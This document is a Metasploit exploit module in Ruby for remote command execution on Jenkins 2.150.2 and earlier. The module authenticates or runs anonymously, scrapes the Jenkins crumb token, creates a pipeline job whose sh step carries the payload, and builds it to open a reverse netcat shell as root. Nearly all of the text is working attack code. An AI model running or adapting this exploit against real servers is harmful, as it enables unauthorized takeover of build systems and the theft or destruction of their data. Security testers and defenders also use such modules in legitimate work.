# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
          &#039;Name&#039;           => &#039;Jenkins <= 2.150.2 Remote Command Execution via Node JS (Metasploit)&#039;,
          &#039;Description&#039;    => %q{
                  This module can run commands on the system using Jenkins users who has JOB creation and BUILD privileges.
                  The sh parameter allows us to run commands.
                  Sample script: 
                                node {
                                      sh "whoami"
                                }
                  In addition, ANONYMOUS users also have the authority to JOB create and BUILD by default.
                  Therefore, all users without console authority can run commands on the system as root privilege.
          },
          &#039;Author&#039;         => [
            &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Vulnerability Discovery, PoC & Msf Module
          ],
          &#039;License&#039;        => MSF_LICENSE,
          &#039;References&#039;     =>
            [
              [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/Jenkins-Remote-Command-Execution-via-Node-JS-Metasploit.html&#039;]
            ],
          &#039;Privileged&#039;     => true,
          &#039;Payload&#039;        =>
            {
              &#039;DisableNops&#039; => true,
              &#039;Space&#039;       => 512,
              &#039;Compat&#039;      =>
                {
                  &#039;PayloadType&#039; => &#039;cmd&#039;,
                  &#039;RequiredCmd&#039; => &#039;reverse netcat generic perl ruby python telnet&#039;,
                }
            },
          &#039;Platform&#039;       => &#039;unix&#039;,
          &#039;Arch&#039;           => ARCH_CMD,
          &#039;Targets&#039;        => [[ &#039;Jenkins <= 2.150.2&#039;, { }]],
          &#039;DisclosureDate&#039; => &#039;Feb 11 2019&#039;,
          &#039;DefaultTarget&#039;  => 0,
          &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat&#039; }))

          register_options(
            [
                OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039;, &#039;&#039; ]),
                OptString.new(&#039;PASSWORD&#039;, [ false, &#039;The password for the specified username&#039;, &#039;&#039; ]),
                OptString.new(&#039;PATH&#039;, [ true, &#039;The path to jenkins&#039;, &#039;/&#039; ]),
            ], self.class)
    end
##
# Jenkins activity check
##
 
    def check
        res = send_request_cgi({&#039;uri&#039; => "/login"})
        if res and res.headers.include?(&#039;X-Jenkins&#039;)
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        print_status(&#039;Attempting to login to Jenkins dashboard&#039;)
        res = send_request_cgi({&#039;uri&#039; => "/script"})
        if not (res and res.code)
            fail_with(Exploit::Failure::Unknown)
        end
 
        sessionid = &#039;JSESSIONID&#039; << res.get_cookies.split(&#039;JSESSIONID&#039;)[1].split(&#039;; &#039;)[0]
        @cookie = "#{sessionid}"
	print_status("#{sessionid}")
 
        if res.code != 200
            print_status(&#039;Logging in...&#039;)
##
# Access control and information
##
            res = send_request_cgi({
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => "/j_acegi_security_check",
                &#039;cookie&#039;    => @cookie,
                &#039;vars_post&#039; =>
                    {
                        &#039;j_username&#039; => Rex::Text.uri_encode(datastore[&#039;USERNAME&#039;], &#039;hex-normal&#039;),
                        &#039;j_password&#039; => Rex::Text.uri_encode(datastore[&#039;PASSWORD&#039;], &#039;hex-normal&#039;),
                        &#039;Submit&#039;     => &#039;Sign+in&#039;
                    }
            })

            if not (res and res.code == 302) or res.headers[&#039;Location&#039;] =~ /loginError/
                print_error(&#039;User Login failed. If anonymous login is active, exploit will continue.&#039;)
            end
        else
            print_status(&#039;No authentication required, skipping login...&#039;)
        end
##
# Check Crumb for create pipeline
##
	cookies = res.get_cookies
        res = send_request_cgi({
	    &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039; => "/view/all/newJob",
            &#039;cookie&#039;  => cookies
        })

        html = res.body
        if html =~ /Jenkins-Crumb/
          print_good("Login Successful")
        else
          print_status("Service found, but login failed")
          exit 0
        end

	crumb = res.body.split(&#039;Jenkins-Crumb&#039;)[1].split(&#039;");<&#039;)[0].split(&#039;"&#039;).last
        print_status("Jenkins-Crumb: #{crumb}")
##
# Create Pipeline
##
        res = send_request_cgi({
	    &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039; => "/view/all/createItem",
            &#039;cookie&#039;  => cookies,
            &#039;vars_post&#039; =>
                {
                    &#039;name&#039; => "cmd",
                    &#039;mode&#039; => "org.jenkinsci.plugins.workflow.job.WorkflowJob",
                    &#039;from&#039; => "",
                    &#039;Jenkins-Crumb&#039; => "#{crumb}",
                    &#039;json&#039; => "%7B%22name%22%3A+%22cmd%22%2C+%22mode%22%3A+%22org.jenkinsci.plugins.workflow.job.WorkflowJob%22%2C+%22from%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%22528f90f71b2d2742299b4daf503130ac%22%7"
                }
        })

##
# Configure Pipeline
##
        shell = payload.encoded
        res = send_request_cgi({
	    &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039; => "/job/cmd/configSubmit",
            &#039;cookie&#039;  => cookies,
            &#039;vars_post&#039; =>
                {
                    &#039;description&#039; => "cmd",
                    &#039;Jenkins-Crumb&#039; => "#{crumb}",
                    &#039;json&#039; => "{\"description\": \"cmd\", \"properties\": {\"stapler-class-bag\": \"true\", \"hudson-security-AuthorizationMatrixProperty\": {}, \"jenkins-model-BuildDiscarderProperty\": {\"specified\": false, \"\": \"0\", \"strategy\": {\"daysToKeepStr\": \"\", \"numToKeepStr\": \"\", \"artifactDaysToKeepStr\": \"\", \"artifactNumToKeepStr\": \"\", \"stapler-class\": \"hudson.tasks.LogRotator\", \"$class\": \"hudson.tasks.LogRotator\"}}, \"org-jenkinsci-plugins-workflow-job-properties-DisableConcurrentBuildsJobProperty\": {\"specified\": false}, \"org-jenkinsci-plugins-workflow-job-properties-DisableResumeJobProperty\": {\"specified\": false}, \"com-coravy-hudson-plugins-github-GithubProjectProperty\": {}, \"org-jenkinsci-plugins-workflow-job-properties-DurabilityHintJobProperty\": {\"specified\": false, \"hint\": \"MAX_SURVIVABILITY\"}, \"org-jenkinsci-plugins-pipeline-modeldefinition-properties-PreserveStashesJobProperty\": {\"specified\": false, \"buildCount\": \"1\"}, \"hudson-model-ParametersDefinitionProperty\": {\"specified\": false}, \"jenkins-branch-RateLimitBranchProperty$JobPropertyImpl\": {}, \"org-jenkinsci-plugins-workflow-job-properties-PipelineTriggersJobProperty\": {\"triggers\": {\"stapler-class-bag\": \"true\"}}}, \"disable\": false, \"hasCustomQuietPeriod\": false, \"quiet_period\": \"5\", \"displayNameOrNull\": \"\", \"\": \"0\", \"definition\": {\"script\": \"node {\\n    sh \\\"#{shell}\\\"\\n}\", \"\": [\"try sample Pipeline...\", \"\\u0001\\u0001\"], \"sandbox\": true, \"stapler-class\": \"org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition\", \"$class\": \"org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition\"}, \"core:apply\": \"\", \"Jenkins-Crumb\": \"#{crumb}\"}",
                    &#039;Submit&#039; => "Save"
                }
        })

        if res.code == 302
          print_good("Pipeline was created and Node JS code was integrated.")
        end
##
# Build Pipeline and Execute payload
##
        print_status("Trying to get remote shell...")
        res = send_request_cgi({
	    &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039; => "/job/cmd/build?delay=0sec",
            &#039;cookie&#039;  => cookies,
            &#039;vars_post&#039; =>
                {
                    &#039;Jenkins-Crumb&#039; => "#{crumb}"
                }
        })
    handler
    end
end
##
# End
##

